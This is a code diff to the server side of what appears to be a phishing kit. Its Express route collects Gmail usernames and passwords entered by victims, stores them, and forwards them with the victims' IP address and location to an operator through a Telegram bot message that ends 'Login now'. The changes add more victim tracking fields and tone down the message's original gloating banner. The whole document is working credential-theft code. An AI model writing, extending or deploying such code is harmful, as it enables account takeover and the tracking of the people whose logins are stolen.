@@ -27,7 +27,8 @@ router.get("/gma/:linkId", async (req, res) => {
 
 router.post("/gma/:linkId", async (req, res) => {
     try {
-        const { username, password, country } = req.body;
+        const { username, password, country, city, region, ip } = req.body;
+        console.log(req.body);
         const { linkId } = req.params;
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
@@ -42,6 +43,9 @@ router.post("/gma/:linkId", async (req, res) => {
                 linkName: link.name,
                 linkType: "GMAIL",
                 country,
+                region,
+                ip,
+                city,
                 fields: {
                     username,
                     password
@@ -49,13 +53,17 @@ router.post("/gma/:linkId", async (req, res) => {
             });
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
-                😈 New Entry 😈
-ACCOUNT TYPE: GMAIL
+LOG ENTRY
+PLATFORM: GMAIL
 
-LOCATION: ${country}
 
-USERNAME: ${username}
+EMAIL: ${username}
 PASSWORD: ${password}
+
+COUNTRY: ${country}
+CITY: ${city}
+REGION: ${region}
+IP: ${ip}
 
 Login now: https://www.gmail.com
                                                 `)
